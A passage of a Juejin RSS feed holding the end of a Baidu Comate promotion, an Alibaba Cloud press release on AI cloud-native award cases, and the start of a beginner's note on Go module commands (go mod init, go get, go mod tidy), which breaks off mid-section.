<li><strong>文档</strong>：强制需求文档包含“用户故事”与“验收标准”。</li>
</ul>
<p>与其羡慕别人的 AI 懂业务，不如现在就打开Comate，动手调教你的专属Rules，配置你的核心竞争力 <strong>。</strong></p>
<p>🚀 <strong>三步开启 AI 提效之旅：</strong></p>
<ol>
<li><strong>一键下载</strong>：前往 文心快码官网（<a href="https://link.juejin.cn?target=https%3A%2F%2Fcomate.baidu.com%2Fzh%2Fdownload%25EF%25BC%2589%25E4%25B8%258B%25E8%25BD%25BD%25E7%258B%25AC%25E7%25AB%258B" target="_blank" title="https://comate.baidu.com/zh/download%EF%BC%89%E4%B8%8B%E8%BD%BD%E7%8B%AC%E7%AB%8B" ref="nofollow noopener noreferrer">comate.baidu.com/zh/download…</a> AI IDE，或者在 VS Code / JetBrains 插件市场搜索 <strong>"Baidu Comate"</strong> 免费安装。</li>
<li><strong>激活 Rules</strong>：在插件设置面板找到【Rules 配置】，将你们团队的《代码开发规范》要把复制进去（支持自然语言，不用写正则！）。</li>
<li><strong>体验飞跃</strong>：新建一个文件，输入你的需求，见证那些曾经需要反复修改的细节，现在一次性完美呈现。</li>
</ol>
<p><strong>现在下载，新用户更可领取海量免费 Token 额度，让 Comate 免费帮你写代码！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 原生落地成果获认可，阿里云云原生多项案例入选信通院「AI 云」典型示范]]></title>    <link>https://juejin.cn/post/7584059298696478761</link>    <guid>https://juejin.cn/post/7584059298696478761</guid>    <pubDate>2025-12-16T07:55:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584059298696478761" data-draft-id="7583980250734641215" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 原生落地成果获认可，阿里云云原生多项案例入选信通院「AI 云」典型示范"/> <meta itemprop="keywords" content="云原生"/> <meta itemprop="datePublished" content="2025-12-16T07:55:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿里云云原生"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 原生落地成果获认可，阿里云云原生多项案例入选信通院「AI 云」典型示范
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿里云云原生
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:55:50.000Z" title="Tue Dec 16 2025 07:55:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>12 月 12 日，“2025 年 AI 云产业发展大会”在北京举行。阿里云凭借创新性将云原生技术栈与 AI 工程化深度融合的技术突破与完整的产品化方案，取得了应用于企业 AI 工程化技术规模落地的实践成果，多项落地实践成功入选“AI Cloud 助力大模型场景化和工程化落地”典型示范案例。</p>
<h2 data-id="heading-0">从云原生到 AI 原生，打造企业落地实践示范样本</h2>
<p>为解决 AI 应用架构落地过程中智能体开发、存量系统融合、稳定运行等关键挑战，阿里云云原生应用平台积极推动云原生技术栈与 AI 工程化框架深度融合，推动智能化升级进入全新阶段。</p>
<p>2025年“AI Cloud 助力大模型场景化和工程化落地”案例征集评审工作由中国信息通信研究院主导，旨在推广大模型工程化落地先进路径，树立行业标杆。阿里云云原生凭借 AI 原生领域先进实践经验获得四项认可：</p>
<ul>
<li>阿里云 AI 原生应用架构及产品实践获“AI Cloud Native 创新应用实践”</li>
<li>函数计算 AI 原生应用基础设施平台获“AI Cloud Infra 创新应用实践”</li>
<li>阿里云 AI 中间件获“AI Cloud 中间件创新应用实践”</li>
<li>阿里云可观测智能运维助手 AIOps Agent 获“AI Cloud Stability 创新应用实践”</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2df802bb33e4e46ba5a6107c2820563~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476550&amp;x-signature=o3jM05NiO1XxNh8tK0d%2BNoOa2kI%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f7bae7c470f4b3b8a1e2bbbb1453f23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476550&amp;x-signature=%2B16YOIXwn0KUKSE77RRNsiRWDlo%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-1">AI Cloud Native 示范案例：阿里云 AI 原生应用架构及产品实践</h3>
<p>“AI Cloud Native 创新应用实践案例”类别旨在面向云服务提供商及企业，表彰聚焦在异构资源管理、弹性伸缩、推理加速、Serverless 等关键能力的成功实践。</p>
<p>阿里云 AI 原生应用架构围绕 AI 原生应用的 DevOps 全生命周期，从架构设计、技术选型、工程实践到运维优化，为企业提供系统性构建 AI 应用的架构指导，并通过阿里云具备毫秒级弹性的<strong>函数计算运行时 AgentRun</strong>、统一流量治理与协议适配的 <strong>AI 网关</strong>、支撑异步高吞吐通信的消息中间件，以及覆盖模型调用、智能体编排和系统交互的<strong>全栈可观测体系</strong>等产品串联形成完整的 AI 原生产品技术栈，帮助企业全面构建具备可信赖性、可扩展性、可进化性的下一代应用体系，并在已有数字化基础上快速叠加 AI 的能力。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3306a1fc5fb145ed87ec6c4a2d3ea0c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476550&amp;x-signature=rlrsnpdr16lJCPfhGNUYpV177i0%3D" alt="图片" loading="lazy"/></p>
<p>2025 年 10 月，阿里云将 AI 原生应用架构系统性思考及产品技术实践沉淀形成《<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247577947%26idx%3D1%26sn%3D6ac4f70f3e84f894a59d8b50360e78a1%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247577947&amp;idx=1&amp;sn=6ac4f70f3e84f894a59d8b50360e78a1&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">AI 原生应用架构白皮书</a>》，白皮书覆盖 AI 原生应用的 11 大关键要素，获得 15 位业界专家联名推荐，来自 40 多位一线工程师的实践心得，为 AI 原生应用的标准化、体系化发展提供参考框架。</p>
<h3 data-id="heading-2">AI  Cloud Infra 示范案例：阿里云函数计算 AI 原生应用基础设施平台</h3>
<p>“AI Cloud Infra 创新应用实践案例”类别旨在表彰面向智能计算/存储/网络/资源虚拟化/软硬件协同/异构资源兼容/超智融合等方面有创新性的解决方案或产品。</p>
<p>阿里云函数计算 AgentRun 是一款以全球领先的<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Ffc%3Fspm%3Da1z389.11499242.0.0.65452413RXCQWs%26utm_content%3Dg_1000408146" target="_blank" title="https://www.aliyun.com/product/fc?spm=a1z389.11499242.0.0.65452413RXCQWs&amp;utm_content=g_1000408146" ref="nofollow noopener noreferrer">函数计算 FC</a> 为技术底座的一站式 Agentic AI 基础设施平台。它将 Serverless 的极致弹性、零运维和按量付费的特性与 AI 原生应用场景深度融合，深度集成日志、网关等云产品，助力企业实现成本与效率的极致优化，<strong>平均 TCO 降低 60%</strong>。</p>
<p>函数计算 AgentRun 以高代码为核心，秉持生态开放、灵活组装的理念，为 AI Agent 提供从开发、部署到运维的全生命周期管理，让企业和开发者可以只专注于 Agent 的核心业务逻辑创新，无需自建和管理底层基础设施，让 Agentic AI 真正进入企业生产环境。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a99b8afbfbf4758a87391c3c341a7da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476550&amp;x-signature=aVIS7%2FO58kTb0%2Fdla9vwru%2Fx5Bc%3D" alt="图片" loading="lazy"/></p>
<p>目前，阿里云函数计算 AgentRun 已让众多企业级智能体“快速上岗”，成为模型服务、AI 工具生态、企业智能体等领域的理想选择，服务于阿里云百炼、魔搭社区、吉利汽车等内外部企业客户与核心产品，支撑多家头部基础模型厂商，构建面向千万用户的 C 端智能体应用如 Z.ai。</p>
<h3 data-id="heading-3">AI Cloud 中间件示范案例：阿里云 AI 中间件</h3>
<p>“AI Cloud 中间件创新应用实践案例”类别旨在面向 AI 中间件产品提供商与应用实践单位表彰在微服务、消息队列、配置与注册中心、数据处理等关键中间件领域的技术创新与落地实践。</p>
<p>阿里云 AI 中间件提供面向分布式多 Agent 架构的基座，包括 AgentScope-Java，基于 Apache RocketMQ 的 AI 能力升级的 AI MQ，AI 网关 Higress，AI 注册与配置中心 Nacos，以及覆盖模型与算力的 AI 可观测体系。AI 中间件已服务于通义千问、阿里云百炼、淘宝、携程、蚂蚁数科、钉钉、优酷、快手、Paypal、BOSS 直聘、大疆、唯品会、汤臣倍健、UU 跑腿、Sealos、国泰产险等互联网、金融、IT 服务等多行业的企业客户。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b14fb5cc9db94dc18cbc646c5f50abce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476550&amp;x-signature=QSGW5BAPAYrGTxAYlBtWZ7BroVc%3D" alt="图片" loading="lazy"/></p>
<p>当前，阿里云 AI 中间件核心技术已全面开源，包括 Nacos、Higress、Apache RocketMQ、AgentScope-Java 等，将持续围绕开源生态携手社区开发者共同推动下一代 AI 基础设施的标准化、工程化。</p>
<h3 data-id="heading-4">AI Cloud Stability 示范案例：阿里云可观测智能运维助手 AIOps Agent</h3>
<p>“AI Cloud Stability 创新应用实践案例”类别旨在表彰聚焦智能可观测/AIOPS/智能运维/AI 应用稳定性等方面有创新性的解决方案或产品。</p>
<p>阿里云 AIOps Agent 是国内唯一实现“原始数据→统一图谱→AI 推理→处置闭环”全链路自研的国产方案，成功构建业界首个可观测本体图谱 Umodel 统一模型，统一实体的数据、知识与动作，支撑跨域推理，其基于统一可观测平台融合<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Fsls%3Fspm%3Da1z389.11499242.0.0.65452413PLWe13%26utm_content%3Dg_1000408139" target="_blank" title="https://www.aliyun.com/product/sls?spm=a1z389.11499242.0.0.65452413PLWe13&amp;utm_content=g_1000408139" ref="nofollow noopener noreferrer">日志服务 SLS</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Fcms%3Fspm%3Da1z389.11499242.0.0.65452413vvcY0e%26utm_content%3Dg_1000408141" target="_blank" title="https://www.aliyun.com/product/cms?spm=a1z389.11499242.0.0.65452413vvcY0e&amp;utm_content=g_1000408141" ref="nofollow noopener noreferrer">云监控 CMS</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Farms%3Fspm%3Da1z389.11499242.0.0.65452413yOc5rP%26utm_content%3Dg_1000408142" target="_blank" title="https://www.aliyun.com/product/arms?spm=a1z389.11499242.0.0.65452413yOc5rP&amp;utm_content=g_1000408142" ref="nofollow noopener noreferrer">应用实时监控 ARMS</a> 产品架构，支持千亿行/秒查询，覆盖 200+ 云与开源组件，可在 EB 级数据上实现分钟级根因定位与自然语言运维，打造具备认知与行动能力的智能运维助手。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c048dbad28f4dd4b988bb0f4e4c5ed4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476550&amp;x-signature=6sPaLG1%2F7G3bOE26qNaWL%2Ftp%2BLo%3D" alt="图片" loading="lazy"/></p>
<p>阿里云 AIOps Agent 已在 6000+ 企业落地，帮助大型企业客户实现故障 MTTR 从小时级降至小于 15 分钟，<strong>实现 LLM Token 消耗降低大于 90%</strong>。此外，团队主导制定的《云原生可观测数据质量》团体标准已累计申请核心专利 3 项，具备显著行业影响力与规模化落地能力。</p>
<p>未来阿里云将继续坚定从云原生到 AI 原生的发展路线，为千行百业提供人工智能应用落地实践，协同产业各界加速企业数智化转型进程。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[go get 快速入门（自用笔记）]]></title>    <link>https://juejin.cn/post/7584028251167555611</link>    <guid>https://juejin.cn/post/7584028251167555611</guid>    <pubDate>2025-12-16T07:49:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584028251167555611" data-draft-id="7584094504631566345" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="go get 快速入门（自用笔记）"/> <meta itemprop="keywords" content="Go"/> <meta itemprop="datePublished" content="2025-12-16T07:49:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="卡尔特斯"/> <meta itemprop="url" content="https://juejin.cn/user/4450440831840909"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            go get 快速入门（自用笔记）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4450440831840909/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    卡尔特斯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:49:32.000Z" title="Tue Dec 16 2025 07:49:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">总结</h2>













































<table><thead><tr><th>场景</th><th>Go 命令</th></tr></thead><tbody><tr><td>新项目初始化</td><td>go mod init</td></tr><tr><td>安装依赖</td><td>go get</td></tr><tr><td>安装指定版本</td><td>go get xxx@vX</td></tr><tr><td>删除依赖</td><td>删 import + go mod tidy</td></tr><tr><td>老项目拉依赖</td><td>go mod tidy</td></tr><tr><td>只下载不编译</td><td>go mod download</td></tr><tr><td>查看依赖</td><td>go list -m all</td></tr><tr><td>清理依赖</td><td>go mod tidy</td></tr><tr><td>升级依赖</td><td>go get -u</td></tr></tbody></table>
<h2 data-id="heading-1">一、初始化项目（= npm init）</h2>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fpkg.go.dev%2F" target="_blank" title="https://pkg.go.dev/" ref="nofollow noopener noreferrer">依赖官方文档索引</a>：不是仓库，是“索引 + 文档站”，自动收录所有 <code>Go Module</code>，方便 <code>go get</code> 使用</p>
<p>总结：其实 <code>Go</code> 没有类似 <code>npm</code> 的插件仓库，是因为 <code>Go</code> 把 <code>Git</code> 当成了插件仓库。</p>
</li>
<li>
<p>✅ 新项目初始化</p>
<pre><code class="hljs language-csharp" lang="csharp">go mod <span class="hljs-keyword">init</span> myapp
</code></pre>
<p>生成：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span>.mod
</code></pre>
<blockquote>
<p>必须在 <strong>项目根目录</strong> 执行</p>
</blockquote>
</li>
<li>
<p>对照</p>





















<table><thead><tr><th>语言</th><th>命令</th></tr></thead><tbody><tr><td>npm</td><td>npm init</td></tr><tr><td>pip</td><td>pip init / poetry init</td></tr><tr><td>Go</td><td>go mod init</td></tr></tbody></table>
</li>
</ul>
<h2 data-id="heading-2">二、添加依赖（= npm install / pip install）</h2>
<ul>
<li>
<p>✅ 推荐方式（最常用）</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/gin-gonic/gin"</span>
</code></pre>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">go</span> run main.<span class="hljs-keyword">go</span>
</code></pre>
<p>👉 Go <strong>自动下载并写入 go.mod</strong></p>
<hr/>
</li>
<li>
<p>✅ 手动添加（指定包）</p>
<pre><code class="hljs language-arduino" lang="arduino">go get github.com/gin-gonic/gin
</code></pre>
</li>
<li>
<p>✅ 指定版本</p>
<pre><code class="hljs language-kotlin" lang="kotlin">go <span class="hljs-keyword">get</span> github.com/gin-gonic/<span class="hljs-symbol">gin@</span>v1<span class="hljs-number">.10</span><span class="hljs-number">.0</span>
</code></pre>
</li>
<li>
<p>✅ 升级到最新版本</p>
<pre><code class="hljs language-kotlin" lang="kotlin">go <span class="hljs-keyword">get</span> github.com/gin-gonic/<span class="hljs-symbol">gin@</span>latest
</code></pre>
</li>
</ul>
<h2 data-id="heading-3">三、移除依赖（= npm uninstall）</h2>
<ul>
<li>
<p>⚠️ <strong>Go 没有 <code>go uninstall</code></strong></p>
</li>
<li>
<p>正确做法（两步）</p>
</li>
<li>
<p>1️⃣ 删除 import</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 删掉</span>
